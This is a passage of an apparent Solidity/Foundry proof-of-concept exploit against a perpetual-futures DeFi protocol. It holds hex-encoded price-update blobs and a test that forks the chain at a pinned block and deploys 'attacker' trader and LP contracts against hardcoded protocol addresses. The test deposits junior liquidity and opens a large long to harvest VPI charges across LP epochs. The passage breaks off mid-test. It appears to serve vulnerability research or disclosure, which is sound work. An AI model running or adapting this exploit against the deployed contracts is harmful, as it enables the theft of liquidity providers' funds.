d0848a5d4865eae79ea0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd0055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f800000000000141af0000000000000003fffffffb000000006ae4e9a7000000006ae4e9a600000000000141c400000000000000030c7aa36a0a5752873e567d8a5e83270c93ef202c3094f20d8e3ca13251ba690a7d2c398289b5f53573543fa9f0ceeb38d2aa7fa8f8afb6c3253a8f7d2e20b6360f53af3158447e7d02b41189e6f7bb15c9f35f869a031652640d2cc150eaed46c78df85da5eac8c3c910b9ef28d71752396051012bf6202274599b0b34233cb38a3f2adb2765f51515fe89918406046bef13819ac0334bca94348abc451d1c84090a72ef95411ad9937d3f634f5f4da4b91787e00707bd4dc7df01bacfb581f777ce176c0c15271fdaa0366e5528ddcf959f672ec4acd49856285477c5dbd3605bfd5c1019cf65a3ba3aba0b738b5a94fd";
/// pt=1793386983 block=324429099 tx=0x42a54e31023a4c2befaa5da173e190385b44ed6a61e26db302d45db2ccb4858b - epoch 498163 B-close mark
bytes internal constant T4_B_CLOSE_163 = hex"504e415501000000012401000000010301d526522592b2f4555118e745b1409d0f688c77a223fc900ede877077ac5f56e2483aa25be2390976e5ac20e82a91dd3a5cdb70f4878f67fc8b746e3ff6a18aa7000249ecfc13ccc12882d6cd35fab5abeb9244ac535eabf56a5525bf8a76b82059ed3ad2d9021e56d52494d6b0da8afc01ba4833d9e4e873313c2a0ec387026824300104760c7b8ed540d93fdb85e1d05d78fa8eb97d1855d14be3be5f81fb55a25c28f029a293fd0a0053103891e92e05af3927591312578f8bc82e6ceb45e113c18de6016ae4e9e700000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000859e2460c0041555756000000000859e2460c0000000000876a9581f9561744fc63b55096f27d7f1781ca06005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b4360000000000000003fffffffb000000006ae4e9e7000000006ae4e9e6000000000001b40200000000000000020c6ef848872031e42d63765f9c9b12353ad3b52e3bc1b1e8ad42e762f55062e74ab660b613c86961284abbbeb5b5f9d7ab257f4e10da77b4233e92328dc91933318cfba2c106480c19d2d54a7a2a8ec1f36792914ca7d1aa517921010ba85155ce3612c63ab3a30fd71c80b31a959e560ba975dbd2ca79271b5a766b8b49b12f9606ad6323e32bcb03d5ad84170a12149a30bc686965c77fd1699690ddbcad7917f4a9a5413df2a5850ca7c7400614095b54a01a744e44e7fe1850910be650ec72c8af7b2d41a4d56248160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf92005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000266b50000000000000007fffffffd000000006ae4e9e7000000006ae4e9e600000000000266d900000000000000050c4a1cee052dfaf65be71630977875c127bb18468e62d11693ed670e6166fafc8a9f0de90750f3243528b4a41109b29041ec53f3cb84533cafc1c66586b5e7011533ae073f5a763369077d3e7ee9d42ee36792914ca7d1aa517921010ba85155ce3612c63ab3a30fd71c80b31a959e560ba975dbd2ca79271b5a766b8b49b12f9606ad6323e32bcb03d5ad84170a12149a30bc686965c77fd1699690ddbcad7917f4a9a5413df2a5850ca7c7400614095b54a01a744e44e7fe1850910be650ec72c8af7b2d41a4d56248160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf9200550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020b3f0000000000000004fffffffb000000006ae4e9e7000000006ae4e9e60000000000020b2700000000000000040c76601f0fb4ef08e4c422acaf956fc64028e2651cc1b1e8ad42e762f55062e74ab660b613c86961284abbbeb5b5f9d7ab257f4e10da77b4233e92328dc91933318cfba2c106480c19d2d54a7a2a8ec1f36792914ca7d1aa517921010ba85155ce3612c63ab3a30fd71c80b31a959e560ba975dbd2ca79271b5a766b8b49b12f9606ad6323e32bcb03d5ad84170a12149a30bc686965c77fd1699690ddbcad7917f4a9a5413df2a5850ca7c7400614095b54a01a744e44e7fe1850910be650ec72c8af7b2d41a4d56248160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf920055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca000000000002212f0000000000000004fffffffb000000006ae4e9e7000000006ae4e9e6000000000002212a00000000000000040cd2fbb698de33c1b7f904a8cf976c48d3e36a35c67322c29186d59a64376eef1c074f38d5d528f74428b4a41109b29041ec53f3cb84533cafc1c66586b5e7011533ae073f5a763369077d3e7ee9d42ee36792914ca7d1aa517921010ba85155ce3612c63ab3a30fd71c80b31a959e560ba975dbd2ca79271b5a766b8b49b12f9606ad6323e32bcb03d5ad84170a12149a30bc686965c77fd1699690ddbcad7917f4a9a5413df2a5850ca7c7400614095b54a01a744e44e7fe1850910be650ec72c8af7b2d41a4d56248160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf920055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000efad8000000000000006cfffffffb000000006ae4e9e7000000006ae4e9e600000000000efc7800000000000000690ce74cc11c2eb9733e533af76f182375d037966d89849bfd6b1367c03bcbb3f25e41beeb8e076f59033389e81437925f9e854100906e7738ded13591335b3cefd0aa6fcc9ed909498e62240ce57d4a1ce58903f6973fbb6a30b87d2e76ef515f8a717be69b9fa73cdca2ae2c8694995e4fdc90a723fbd8434e72edc5d47b7e0857fc737a5fc520cf64af9a939c9d31244a75278fefe1aa421c124c041f1c42744a4511ad89703c6e9682d99f75a2ba8969b6e6fcb60cca046521407396b4fe0883de2383ce5726151848160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf920055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f800000000000141b50000000000000004fffffffb000000006ae4e9e7000000006ae4e9e600000000000141c300000000000000030c8d64b5e01206fa7c18678aa7d35dafd2738d163162d11693ed670e6166fafc8a9f0de90750f3243528b4a41109b29041ec53f3cb84533cafc1c66586b5e7011533ae073f5a763369077d3e7ee9d42ee36792914ca7d1aa517921010ba85155ce3612c63ab3a30fd71c80b31a959e560ba975dbd2ca79271b5a766b8b49b12f9606ad6323e32bcb03d5ad84170a12149a30bc686965c77fd1699690ddbcad7917f4a9a5413df2a5850ca7c7400614095b54a01a744e44e7fe1850910be650ec72c8af7b2d41a4d56248160314656536e8f45bde8a3600e2f9c70d6cce47ecd1c1f29aa987a296dd1d833598ee2821cf92";
/// pt=1793392349 block=324448755 tx=0x123d8d5867b91f673bdd2ae0a26d72d3ae28862764017fbe8847795a72f5b04c - epoch 498164 control-settle mark (FAD window)
}
```

### test/Ticks164.sol (primary path)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;
library Ticks164 {
/// pt=1793391128 block=324444250 tx=0x0b3b0f92acd408e81b48b4ef0d38ebccc87b9fe49c8f425a059b7e8737bd11830 - epoch 498164 deferred router-settle mark (basket 96486558, +0.136bp vs the T1 open mark)
bytes internal constant T5_DEF_SETTLE_164 = hex"504e41550100000001240100000001030189783ebbccd5ecab54a4f7b9d34f52c0208e1bafe3ceaa58baed021ea64d85754789ab6f2acbd7e65160bec1662775b878573a8f36f0d55bea6974185897b2fe00025266666113c9d4ab191ced5a15331823570b57f617ab1b975f77e4e72924bcfb4e50b0eafcec45b257d3bb1bfb8036b8463cb40d18fe93c6eb21e78ab92f81300104aefba04784a9ece17903c4ecbfbc394c3982b6794427c25df2b9986c95a01acb65e98af4e888d9686ea28b29a338e8c963b1de99ca32cb9bef8460fb4e43af54006ae4fa1800000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000859e389e00041555756000000000859e389e0000000007bd42b32ba8a70b4abd3d447c7489f97a0b7b6b806005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b4500000000000000003fffffffb000000006ae4fa18000000006ae4fa17000000000001b42a00000000000000020c71328aa2f7333b7fb3500e979a1843870c2785ef7be087958bdb7c08d3bdc2e23cd47fdd512067efce939cda4a812ae773e6cf281c8665e860a983663ec4cb3cbcb55ea07833f6ad1a6e2c5570b0c15a380294dd879eef31ca27ef144b5fb68e441d504a516f78ea80b725a930db9ce041dcf4d71d0dbd2c4599ef28099de864332a5d17d40b049638712e2e036d68706c5f56c2cbc82b05599bc616c232a405b27d16ec56f207d3a6faac4c498ab5b2f339c3979281a56ddeb786402675ffee5457321eca2063a1df0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee87529617005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000267540000000000000006fffffffd000000006ae4fa18000000006ae4fa17000000000002672d00000000000000050c40a58cf0f1c4af7399019f033f7887c54015f7602b50e3260cf782a551e82ffcd6f10af6a9e572dc9207b94e9b544d3330ecdfa810b18a23e09dce1d696ee555053ca4da00787e5c6c4e0a3c7558e6db380294dd879eef31ca27ef144b5fb68e441d504a516f78ea80b725a930db9ce041dcf4d71d0dbd2c4599ef28099de864332a5d17d40b049638712e2e036d68706c5f56c2cbc82b05599bc616c232a405b27d16ec56f207d3a6faac4c498ab5b2f339c3979281a56ddeb786402675ffee5457321eca2063a1df0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee8752961700550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020b520000000000000005fffffffb000000006ae4fa18000000006ae4fa170000000000020b3700000000000000040cf6ec486ab633a0029fd1e724b0180b3614af87d17be087958bdb7c08d3bdc2e23cd47fdd512067efce939cda4a812ae773e6cf281c8665e860a983663ec4cb3cbcb55ea07833f6ad1a6e2c5570b0c15a380294dd879eef31ca27ef144b5fb68e441d504a516f78ea80b725a930db9ce041dcf4d71d0dbd2c4599ef28099de864332a5d17d40b049638712e2e036d68706c5f56c2cbc82b05599bc616c232a405b27d16ec56f207d3a6faac4c498ab5b2f339c3979281a56ddeb786402675ffee5457321eca2063a1df0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee875296170055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca00000000000221830000000000000005fffffffb000000006ae4fa18000000006ae4fa17000000000002216800000000000000040cd46a2db0fcafc33c082e62879dd3e763c18e590089ff82ca44fb7295fae24ce0aa565ae9cbc777f19207b94e9b544d3330ecdfa810b18a23e09dce1d696ee555053ca4da00787e5c6c4e0a3c7558e6db380294dd879eef31ca27ef144b5fb68e441d504a516f78ea80b725a930db9ce041dcf4d71d0dbd2c4599ef28099de864332a5d17d40b049638712e2e036d68706c5f56c2cbc82b05599bc616c232a405b27d16ec56f207d3a6faac4c498ab5b2f339c3979281a56ddeb786402675ffee5457321eca2063a1df0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee875296170055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000efac80000000000000085fffffffb000000006ae4fa18000000006ae4fa1700000000000efba0000000000000006a0c2fda9c35b8de8d3bc8b057c5d7386d5cec09af9f1f3bbeecb7497c89a2694b383921fe3f35856f024e26284353d1dbfdf909e3c5327df33af3f0ecfa769bc36dc7611a6d8f0a6571cc62fe6669b870498e15b300a55be63ae180180d12cfced34eed1548f8b43a830c5912ae110dda384a0a264485149f29e3058fc002187be481ce682b0d39d13a0869c504f349dbb0aa2c95106025e3df8ed16e956bd70087bd4c04972aa716a531b3b191e056b9a7fd14c069039aea84a9181ae39effb772572aaa50248ec41edf0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee875296170055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f800000000000141ee0000000000000004fffffffb000000006ae4fa18000000006ae4fa1700000000000141dd00000000000000030c48879685943e1011e21a1d4c2ca5a29759d23d462b50e3260cf782a551e82ffcd6f10af6a9e572dc9207b94e9b544d3330ecdfa810b18a23e09dce1d696ee555053ca4da00787e5c6c4e0a3c7558e6db380294dd879eef31ca27ef144b5fb68e441d504a516f78ea80b725a930db9ce041dcf4d71d0dbd2c4599ef28099de864332a5d17d40b049638712e2e036d68706c5f56c2cbc82b05599bc616c232a405b27d16ec56f207d3a6faac4c498ab5b2f339c3979281a56ddeb786402675ffee5457321eca2063a1df0e85dd1ffd0a5dc18fefac750b2208775627c011c9ada256ac0b1645150d9fbee45bee87529617";
/// pt=1793391398 block=324445243 tx=0xdba4fb3efec89f97221f2feacc74506eb894045a6872f365723ecf9652848085 - epoch 498164 engine-close mark (basket 96484032, -0.125bp vs the T1 open mark)
bytes internal constant T6_CLOSE_164 = hex"504e4155010000000124010000000103012f6f3ff19b903ebf8fb48b56728bfa22a9c0b7ac147ee8ab98f9894843fef5f1724edfc73890ff9747048898d4f0e507a8f4aaf89c6ec0ae52cd21da63cb67fd00027b75dc8b39e350d01c6e4209058308ce85bc6b3e36c62c9c4feb572d753a0a370cb0eae931bb27ea30d3366b4623ebe13d046e423e16222079c208304b3e24d200049c49ed1e47d82c0970670516713ef05e20a107cfa33b6d9b5438d0b54540d3694f0d11b363ef8df19e59e31cd831230391185de284260f24cd242e436d273e4a006ae4fb2600000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000859e39ef80041555756000000000859e39ef8000000004b9465b6f3bafc42967160cb1b245bd553af410506005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001b4460000000000000003fffffffb000000006ae4fb26000000006ae4fb25000000000001b42c00000000000000020c7593be31ba712469234fce175dd8856a7eeb029cbc6c640727f08e23ec832888b0e8af200fa836cc852a57466f1098398692fa57286697c19d850862556c462df3229dde11784e6cd0ddb61c2afcf1d0019532e7216848590cb9717f41e98eea26b19ec81803906e5547fe0a20ba4404ab5beb15ca59d9b78ad556da5ff903f55e217b043ee27ddf25d9f96bbf2f55bb42159163158f809a6ef11b2a34b4d6b32d2855572278ecc6b62ecea7ee72cbd7337ffe3236e9c6d4850c23b662b9f9aa6911144c81e0b4ed38bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a2005500ef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd5200000000000267570000000000000005fffffffd000000006ae4fb26000000006ae4fb25000000000002673000000000000000050cf96418b58553fecc1ba2eb232f4dc1fff35ef49786e3e2a2810048a340727180deef771abf27d1e7894005f70ab14ec5fbdd987601099b71532f1d80c9aed5953965e36db8222621bff39888c9d6b088019532e7216848590cb9717f41e98eea26b19ec81803906e5547fe0a20ba4404ab5beb15ca59d9b78ad556da5ff903f55e217b043ee27ddf25d9f96bbf2f55bb42159163158f809a6ef11b2a34b4d6b32d2855572278ecc6b62ecea7ee72cbd7337ffe3236e9c6d4850c23b662b9f9aa6911144c81e0b4ed38bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a200550084c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c10000000000020b530000000000000004fffffffb000000006ae4fb26000000006ae4fb250000000000020b3900000000000000040ca4a2f474cfb59b47d3f549b5dbe60a3b7cdf6e72bc6c640727f08e23ec832888b0e8af200fa836cc852a57466f1098398692fa57286697c19d850862556c462df3229dde11784e6cd0ddb61c2afcf1d0019532e7216848590cb9717f41e98eea26b19ec81803906e5547fe0a20ba4404ab5beb15ca59d9b78ad556da5ff903f55e217b043ee27ddf25d9f96bbf2f55bb42159163158f809a6ef11b2a34b4d6b32d2855572278ecc6b62ecea7ee72cbd7337ffe3236e9c6d4850c23b662b9f9aa6911144c81e0b4ed38bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a20055003112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca00000000000221600000000000000006fffffffb000000006ae4fb26000000006ae4fb25000000000002216900000000000000040ce0e40ae7626a1781ee2fbe3f67568f62d2cad88f99d3c8064d8efb3aa2c852ed375016734dc0bd91894005f70ab14ec5fbdd987601099b71532f1d80c9aed5953965e36db8222621bff39888c9d6b088019532e7216848590cb9717f41e98eea26b19ec81803906e5547fe0a20ba4404ab5beb15ca59d9b78ad556da5ff903f55e217b043ee27ddf25d9f96bbf2f55bb42159163158f809a6ef11b2a34b4d6b32d2855572278ecc6b62ecea7ee72cbd7337ffe3236e9c6d4850c23b662b9f9aa6911144c81e0b4ed38bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a20055008ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc67600000000000efa9c000000000000006efffffffb000000006ae4fb26000000006ae4fb2500000000000efb8f000000000000006b0c8c18398a123e98a07eb717481e1b4c08643973d7bcd0997026e0cc9979db9b10e676141ef87f3790a8d4595e2b179065192050827b0a521f021f70d23343fcc604874293b467016f073074dbd0e721d6c09a8df1ca094016985216ffb6975e0c49b4053528d372e39912c4904b22db05059f36980be46c3d1ce1258e612063ad3a1b9f55860a3e69c3b61316e4b81c0235bd13eaa2ee170202da3de8f8bf772e18db73d5a11e916aaf3a89b9d4398a031901a0d9ae4f0deebb6c572d971c221166ba3acf6eb7054638bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a20055000b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f800000000000141eb0000000000000003fffffffb000000006ae4fb26000000006ae4fb2500000000000141de00000000000000030cb70261e3454422b85f0bf3aa5d8c47ccfac6c27d86e3e2a2810048a340727180deef771abf27d1e7894005f70ab14ec5fbdd987601099b71532f1d80c9aed5953965e36db8222621bff39888c9d6b088019532e7216848590cb9717f41e98eea26b19ec81803906e5547fe0a20ba4404ab5beb15ca59d9b78ad556da5ff903f55e217b043ee27ddf25d9f96bbf2f55bb42159163158f809a6ef11b2a34b4d6b32d2855572278ecc6b62ecea7ee72cbd7337ffe3236e9c6d4850c23b662b9f9aa6911144c81e0b4ed38bf0837c68d75288663b2e8469053341b64b39b658595bafe906a9fea9719581fbe7e18404f13a2";
}
```

### test/VpiCrossEpochPoc.sol (primary path)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;
import {Ticks} from "./Ticks.sol";
import {Ticks164} from "./Ticks164.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";
interface Vm {
function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
function envString(string calldata name) external returns (string memory);
function warp(uint256 timestamp) external;
function roll(uint256 blockNumber) external;
function chainId(uint256 newChainId) external;
function recordLogs() external;
function getRecordedLogs() external returns (VmLog[] memory logs);
}
struct VmLog {
bytes32[] topics;
bytes data;
address emitter;
}
interface IERC20 {
function mint(address to, uint256 amount) external;
function approve(address spender, uint256 amount) external returns (bool);
function balanceOf(address account) external view returns (uint256);
}
interface IClearinghouse {
function depositMargin(uint256 amount) external;
function getAccountAssetBuckets(address account)
external
view
returns (uint256 settlementBalance, uint256 totalLocked, uint256 activePositionMargin, uint256 otherLocked, uint256 free);
function vpiRebateReserveAssets(address account) external view returns (uint256);
}
interface IRouter {
function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
external payable returns (OrderV3Types.ExecutionResult memory result);
function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
}
interface IEngine {
function positions(address account)
external
view
returns (uint256 size, uint256 margin, uint256 entryPrice, uint256 maxProfitAssets, CfdTypes.Side side, uint64 lastUpdateTime, int256 vpiAccrued);
function sides(uint256 index)
external
view
returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
function lastMarkPrice() external view returns (uint256);
function lastMarkTime() external view returns (uint64);
function totalTraderClaimBalanceAssets() external view returns (uint256);
}
interface IPool {
struct LpEpochSettlementResult {
uint256 cutoffEpoch;
uint256 seniorFundedShares;
uint256 seniorFundedAssets;
uint256 juniorFundedShares;
uint256 juniorFundedAssets;
uint256 seniorProcessedEpochs;
uint256 juniorProcessedEpochs;
uint256 juniorDepositAssets;
uint256 juniorDepositShares;
uint256 seniorDepositAssets;
uint256 seniorDepositShares;
bool seniorBacklog;
bool juniorBacklog;
bool entriesDeferred;
}
function totalAssets() external view returns (uint256);
function seniorPrincipal() external view returns (uint256);
function juniorPrincipal() external view returns (uint256);
function pendingTradingRevenueAssets() external view returns (uint256);
function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime)
external returns (LpEpochSettlementResult memory result);
}
interface IVault {
function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
function requestRedeemFromClaimableDeposit(uint256 depositRequestId, uint256 shares, address controller)
external returns (uint256 redeemRequestId);
function claimableDepositShares(uint256 requestId, address controller) external view returns (uint256);
function claimableRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
function accruedTotalSupply() external view returns (uint256);
function redeem(uint256 shares, address receiver, address controller) external returns (uint256 assets);
function balanceOf(address a) external view returns (uint256);
}
interface ILifecycleBook {
function currentExecutionConfigHash() external view returns (bytes32);
}
contract Trader {
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IClearinghouse internal constant mch = IClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
IRouter internal constant router = IRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
function fund(uint256 amount) external {
usdg.mint(address(this), amount);
usdg.approve(address(mch), type(uint256).max);
mch.depositMargin(amount);
}
function totalValue() external view returns (uint256) {
(uint256 settlement, uint256 locked, uint256 posMargin,,) = mch.getAccountAssetBuckets(address(this));
require(posMargin == 0, "position margin still locked");
return usdg.balanceOf(address(this)) + settlement + locked;
}
function commitOrder(
bytes32 clientOrderId,
CfdTypes.Side side,
uint256 sizeDelta,
uint256 marginDelta,
uint256 targetPrice,
bool isClose,
uint32 executionWindowSeconds,
uint8 allowedExecutionModes,
bytes32 configHash
) external returns (uint64 orderId) {
OrderV3Types.ExecutionBounds memory bounds = OrderV3Types.ExecutionBounds({
submitBy: type(uint64).max,
executionWindowSeconds: executionWindowSeconds,
allowedExecutionModes: allowedExecutionModes,
expectedConfigHash: configHash,
maxExecutionBountyAssets: type(uint128).max,
maxExecutionNotionalAssets: type(uint128).max,
maxGrossAccountDebitAssets: type(uint128).max,
maxActionChargeAssets: type(uint128).max,
maxExplicitFeesAssets: type(uint128).max,
maxPostPositionSize: type(uint120).max,
minPostSettlementBalanceAssets: 0,
minPostPositionEquityAssets: 0,
maxPostLeverageBps: type(uint32).max
});
OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
clientOrderId: clientOrderId,
side: side,
sizeDelta: sizeDelta,
marginDelta: marginDelta,
targetPrice: targetPrice,
isClose: isClose,
bounds: bounds
});
return router.commitOrder(request);
}
function executeOrder(uint64 orderId, bytes[] calldata payload)
external returns (OrderV3Types.ExecutionResult memory result)
{
return router.executeOrder(orderId, payload);
}
}
contract Lp {
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IVault internal constant junior = IVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
function depositJunior(uint256 assets) external returns (uint256 requestId) {
usdg.mint(address(this), assets);
usdg.approve(address(junior), type(uint256).max);
return junior.requestDeposit(assets, address(this));
}
function requestAllJuniorRedeem(uint256 depositRequestId) external returns (uint256 redeemRequestId) {
uint256 shares = junior.claimableDepositShares(depositRequestId, address(this));
return junior.requestRedeemFromClaimableDeposit(depositRequestId, shares, address(this));
}
function claimJuniorRedeem(uint256 redeemRequestId) external returns (uint256 assets) {
uint256 shares = junior.claimableRedeemRequest(redeemRequestId, address(this));
require(shares > 0, "nothing claimable");
return junior.redeem(shares, address(this), address(this));
}
function juniorShares(uint256 depositRequestId) external view returns (uint256) {
return junior.claimableDepositShares(depositRequestId, address(this));
}
function wallet() external view returns (uint256) {
return usdg.balanceOf(address(this));
}
}
contract VpiCrossEpochTest {
Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IERC20 internal constant usdg = IERC20(0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D);
IClearinghouse internal constant mch = IClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
IRouter internal constant router = IRouter(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444);
IEngine internal constant engine = IEngine(0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA);
IPool internal constant pool = IPool(0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e);
ILifecycleBook internal constant book = ILifecycleBook(0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C);
IVault internal constant juniorVault = IVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
uint256 internal constant SIZE = 19_000e20;
uint256 internal constant ATTACKER_JUNIOR = 2_500_000e6;
uint256 internal constant SENTINEL_JUNIOR = 500_000e6;
uint256 internal constant TRADER_FUNDS = 120_000e6;
uint256 internal constant ORDER_MARGIN = 50_000e6;
uint256 internal constant MIN_PROFIT = 20e6;
uint256 internal constant DEPOSIT_EPOCH = 498161;
Trader internal attackerTrader;
Lp internal attackerLp;
Lp internal sentinel;
uint256 internal pendingRevenueAtPin;
bytes32 internal configHash;
uint256 internal constant T_DEPOSIT = 1_793_379_000;
uint256 internal constant T_ACTIVATE = 1_793_382_400;
uint256 internal constant T_DEPOSIT2 = 1_793_383_400;
uint64 internal constant T_OPEN = 1_793_386_811;
uint256 internal constant T_REQUEST_DEFERRED = 1_793_386_900;
uint256 internal constant T_BANK = 1_793_386_929;
uint256 internal constant T_DEF_SETTLE = 1_793_391_138;
uint256 internal constant T_CLOSE = 1_793_391_408;
uint256 internal constant T_REQUEST_SENTINEL = 1_793_391_500;
uint256 internal constant T_AFTER = 1_793_394_100;
bytes32 internal constant ACTION_REBATE_TOPIC =
0xf551543a712dddd9589c3487b1448b4a8d8750e9d0072b1370bddc3d8b11d437;
bytes32 internal constant LP_EPOCH_SETTLED_TOPIC =
0xcb683c928926f0e5d3426cec6288d011a54cc04072165b80b20be7b3ce9784a4;
function setUp() public {
vm.createSelectFork(vm.envString("HUNT_FORK_URL"), 325012936);
vm.chainId(31337);
configHash = book.currentExecutionConfigHash();
attackerTrader = new Trader();
attackerLp = new Lp();
sentinel = new Lp();
attackerTrader.fund(TRADER_FUNDS);
(uint256 mpL, uint256 oiL,,) = engine.sides(0);
(uint256 mpS, uint256 oiS,,) = engine.sides(1);
require(oiL == 0 && oiS == 0, "pin has open positions - timeline assumption broken");
mpL;
mpS;
console2.log("pool totalAssets at pin:", pool.totalAssets());
console2.log("juniorPrincipal at pin:", pool.juniorPrincipal());
console2.log("junior pendingTradingRevenue at pin:", pool.pendingTradingRevenueAssets());
pendingRevenueAtPin = pool.pendingTradingRevenueAssets();
console2.log("mark at pin:", engine.lastMarkPrice(), engine.lastMarkTime());
}
function _warp(uint256 t) internal {
vm.roll(block.number + 60);
vm.warp(t);
}
function _payload(bytes memory blob) internal pure returns (bytes[] memory p) {
p = new bytes[](1);
p[0] = blob;
}
function testVpiCrossEpochHarvest() public {
_warp(T_DEPOSIT);
uint256 aReq = attackerLp.depositJunior(ATTACKER_JUNIOR);
uint256 sReq = sentinel.depositJunior(SENTINEL_JUNIOR);
require(aReq == DEPOSIT_EPOCH && sReq == DEPOSIT_EPOCH, "deposit epochs unexpected");
_warp(T_ACTIVATE);
pool.settleLpEpoch(0, 0);
uint256 aShares = attackerLp.juniorShares(DEPOSIT_EPOCH);
uint256 sShares = sentinel.juniorShares(DEPOSIT_EPOCH);
require(aShares > 0 && sShares > 0, "deposits not activated");
uint256 juniorP0 = pool.juniorPrincipal();
uint256 supply0 = juniorVault.accruedTotalSupply();
console2.log("attacker/sentinel junior shares:", aShares, sShares);
console2.log("juniorPrincipal/supply after activation:", juniorP0, supply0);
console2.log("pool depth after activation:", pool.totalAssets());
_warp(T_DEPOSIT2);
uint256 sReq2 = sentinel.depositJunior(SENTINEL_JUNIOR);
require(sReq2 == 498163, "T2 deposit epoch unexpected");
_warp(T_OPEN - 1);
uint64 oid = attackerTrader.commitOrder(
"attacker-open", CfdTypes.Side.LONG, SIZE, ORDER_MARGIN, 1, false, 60, 1, configHash
);
uint256 assetsBefore = pool.totalAssets();
_warp(T_OPEN + 10);
OrderV3Types.ExecutionResult memory r = attackerTrader.executeOrder(oid, _payload(Ticks.T1_B_OPEN_163));
console2.log("open status:", uint256(r.status));
require(r.status == OrderV3Types.LifecycleStatus.Executed, "open did not execute");
uint256 poolInflow = pool.totalAssets() - assetsBefore;
(uint256 sz,,,, CfdTypes.Side side,, int256 vpi) = engine.positions(address(attackerTrader));
require(sz == SIZE && side == CfdTypes.Side.LONG, "long not open");
require(vpi > 0, "open carried no positive VPI charge");
uint256 vpiCharged = uint256(vpi);
console2.log("VPI charge V (returnable accrual):", vpiCharged);
console2.log("pool totalAssets inflow at open:", poolInflow);
console2.log("junior pendingTradingRevenue after open:", pool.pendingTradingRevenueAssets());
console2.log("trader vpiRebateReserve after open:", mch.vpiRebateReserveAssets(address(attackerTrader)));
require(poolInflow >= vpiCharged, "VPI cash did not arrive at the pool");
require(mch.vpiRebateReserveAssets(address(attackerTrader)) == 0, "positive VPI got escrowed");
require(pool.pendingTradingRevenueAssets() == pendingRevenueAtPin, "returnable VPI was queued, not live equity");
